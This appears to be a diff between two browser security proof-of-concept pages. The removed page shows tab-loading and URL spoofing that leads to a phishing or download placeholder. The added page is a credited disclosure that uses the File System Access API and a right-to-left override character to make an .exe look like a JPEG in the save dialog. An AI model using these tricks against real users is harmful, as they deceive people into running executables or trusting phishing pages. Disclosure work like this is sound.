@@ -1,54 +1,62 @@
-<p>
-To get the thing you want, please visit the site that you trust:
-<br><a href="http://example.com/" id="link">http://example.com (page)</a>
+<!doctype html>
+<html lang="en">
 
-<p>
-Or download something from the trusted site:
-<br><a href="http://example.com/" id="dl">http://example.com (download)</a>
-<script>
+<head>
+    <meta charset="utf-8">
+    <title>File System Access API - save As JPEG executable</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="icon" type="image/x-icon" href="favicon.png">
+</head>
 
-function open_and_pretend_busy(spoofText, spoofedUrl, finalUrl) {
-    var content = 'You are being redirected to ' + spoofText + '.\n' +
-        'Trust me, just look at the tab icon indicator, it is really spinning.';
-    var spaces = new Array(1000).join(' ');
-    var url = 'data:' + spoofedUrl + spaces + ',' + encodeURIComponent(content);
-    var w = window.open(url);
+<body>
+    <h3>File System Access API - Save shows saving as JPEG, however, download as an executable exe + spoof filename with
+        RTL character</h3>
+    <h4>Found by Maciej Pulikowski - maciekpul@gmail.com</h4>
 
-    // Start provisional loads without committing in order to give the false
-    // appearance that something is happening.
+    <hr>
+    <h3>Gif example/proof:</h3>
+    <a href="rtltrick.gif" target="_blank">GIF URL</a>
+    <hr>
+    <h3>Code example/proof:</h3>
+    <div style="display: flex; flex-direction: column">
+        <img src="cat.jpg" alt="awesome cat" width="500" height="600">
+        <div>
+            <button id="addNewFile" style="font-size: 26px; margin-top: 10px;">Save image</button>
+        </div>
 
-    var time_until_next_page_ms = 4000;
-    var start = Date.now();
-    var timer = setInterval(function() {
-        if (Date.now() - start < time_until_next_page_ms) {
-            // Replies with 204 No Content, so page won't unload.
-            w.location.href = 'https://204.robwu.nl';
-        } else {
-            clearInterval(timer);
+    </div>
+    <script>
 
-            w.location.href = finalUrl;
-        }
-    }, 50);
-}
+        const butSaveNewFile = document.getElementById('addNewFile')
+        butSaveNewFile.addEventListener('mouseup', async () => {
+            const options = {
+                types: [
+                    {
+                        description:
+                            'JPEG Image (*.jpeg)',
+                        accept: {
+                            'text/plain': ['.\u202egepj\u202e.moc.segami.www.exe']
+                        },
+                        content: 'C:\\Windows\\system32\\calc.exe'
+                    }
+                ]
+            }
+            debugger;
 
-document.getElementById('link').onclick = function(e) {
-    e.preventDefault();
+            const handle = await window.showSaveFilePicker(options)
+            const writable = await handle.createWritable()
+            const response = await fetch('putty.exe');
+            await response.body.pipeTo(writable);
+            alert('File saved')
+        })
+    </script>
+    <hr>
+    <h3>Explanation:</h3>
+    <img src="RTLExplanation.png" alt="awesome code" width="1021" height="576">
+    <hr>
+    <h3>Solution:</h3>
+    <p style="font-size: 25px">Block \u202e - RTL character</p>
 
-    var spoofedUrl = 'http://example.com/';
-    // For the sake of the demo this is just a data URL, but attackers
-    // could convincingly create something like
-    // example.com.somelongdomain.somehostingservice.tld and rely on
-    // the trust that users have in the previous page.
-    var finalUrl = 'data:,Some phishing URL and page here';
-    open_and_pretend_busy('the login page', spoofedUrl, finalUrl);
-};
+</body>
 
-
-document.getElementById('dl').onclick = function(e) {
-    e.preventDefault();
-
-    var spoofedUrl = 'http://example.com/';
-    var finalUrl = 'data:application/octet-stream,some virus here';
-    open_and_pretend_busy('[the thing you want to download]', spoofedUrl, finalUrl);
-};
-</script>
+</html>
